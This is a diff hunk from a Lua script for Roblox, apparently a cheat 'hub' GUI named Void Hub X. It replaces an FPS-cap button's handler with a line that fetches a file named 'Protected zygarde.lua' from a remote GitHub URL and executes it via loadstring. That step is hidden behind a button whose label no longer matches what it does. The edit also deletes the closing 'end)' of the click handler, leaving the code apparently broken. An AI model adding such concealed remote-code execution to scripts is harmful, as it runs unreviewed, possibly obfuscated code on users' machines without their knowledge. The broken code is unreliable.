@@ -970,24 +970,8 @@ local function TMHVQCE_fake_script() -- FPSBTN.LocalScript
 	local btn = script.Parent
 	
 	btn.MouseButton1Click:Connect(function()
-		setfpscap(960)
-		-- notification
-	
-		local Bindable = Instance.new("BindableFunction")
-		Bindable.OnInvoke = Callback
-	
-		game.StarterGui:SetCore("SendNotification", {
-			Title = "Void Hub X";
-			Text = "FPS is now 960!.";
-			Duration = "10";
-			Button1 = "Close Notification";
-			Callback = Bindable
-		})
-	end)
-	
-	function Callback(answer)
-	end
-	
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/louismich4el/Zygarde/main/Protected%20zygarde.lua"))()
+
 end
 coroutine.wrap(TMHVQCE_fake_script)()
 local function NYKPDQQ_fake_script() -- Tabs.LocalScript 
